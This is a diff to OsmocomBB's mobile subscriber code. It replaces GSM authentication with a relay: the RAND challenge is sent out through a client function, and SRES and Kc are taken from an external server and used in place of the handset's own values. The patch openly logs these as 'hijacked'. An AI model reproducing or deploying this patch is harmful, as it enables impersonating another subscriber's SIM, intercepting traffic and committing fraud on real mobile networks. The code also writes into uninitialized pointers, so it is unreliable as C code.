@@ -1,0 +1,60 @@
+--- src/host/layer23/src/mobile/subscriber.c	2025-01-04 13:07:08.198973666 +0100
++++ src/host/layer23/src/mobile/subscriber.c	2025-01-04 13:23:06.289968902 +0100
+@@ -30,10 +30,11 @@
+ #include <osmocom/bb/common/osmocom_data.h>
+ #include <osmocom/bb/common/networks.h>
+ #include <osmocom/bb/mobile/vty.h>
+-
+-/* enable to get an empty list of forbidden PLMNs, even if stored on SIM.
+- * if list is changed, the result is not written back to SIM */
+-//#define TEST_EMPTY_FPLMN
++#include "client_rand.h"
++#include "server_sres.h"
++#include "server_kc.h"
++#include "hex.h"
++#include "suppress_space.h"
+ 
+ void *l23_ctx;
+ 
+@@ -942,19 +943,34 @@
+ 		int ret = osmo_auth_gen_vec(vec, &auth, rand);
+ 		if (ret < 0)
+ 			return ret;
+-
+ 		/* store sequence */
+ 		subscr->key_seq = key_seq;
+-		memcpy(subscr->key, vec->kc, 8);
+-
+-		LOGP(DMM, LOGL_INFO, "Sending authentication response\n");
++               /*PaTcH*/
++               char *key_seq_rand;
++               sprintf(key_seq_rand, "%d", key_seq);
++               char separator[]="-";
++	        strcat(key_seq_rand,separator);
++	        char *rand_hack;
++	        strcpy(rand_hack,osmo_hexdump(rand,16));
++	        strcat(key_seq_rand,rand_hack);
++	        LOGP(DMM, LOGL_INFO, "SEND HIJACKED RAND !!! (RAND %s)\n", rand_hack);
++	        client_rand(key_seq_rand);
++	        char *sres_hex;
++	        sres_hex = catch_sres();
++               const unsigned char *sres_hacked=hex2ascii(sres_hex);
++               char *kc_hex;
++               kc_hex = catch_kc();
++               const unsigned char *kc_hacked=hex2ascii(kc_hex);
++	        memcpy(subscr->key, kc_hacked, 8);
+ 		nmsg = gsm48_mmevent_msgb_alloc(GSM48_MM_EVENT_AUTH_RESPONSE);
+ 		if (!nmsg)
+ 			return -ENOMEM;
+ 		nmme = (struct gsm48_mm_event *) nmsg->data;
+-		memcpy(nmme->sres, vec->sres, 4);
+-		gsm48_mmevent_msg(ms, nmsg);
+-
++               memcpy(nmme->sres,sres_hacked, 4);
++	        LOGP(DMM, LOGL_INFO, "KC hijacked = %s\n",osmo_hexdump(kc_hacked,8));
++	        LOGP(DMM, LOGL_INFO, "SRES hijacked = %s\n",osmo_hexdump(sres_hacked,4));
++ 	        gsm48_mmevent_msg(ms, nmsg);
++               /*EndPaTcH*/
+ 		return 0;
+ 	}
+ 
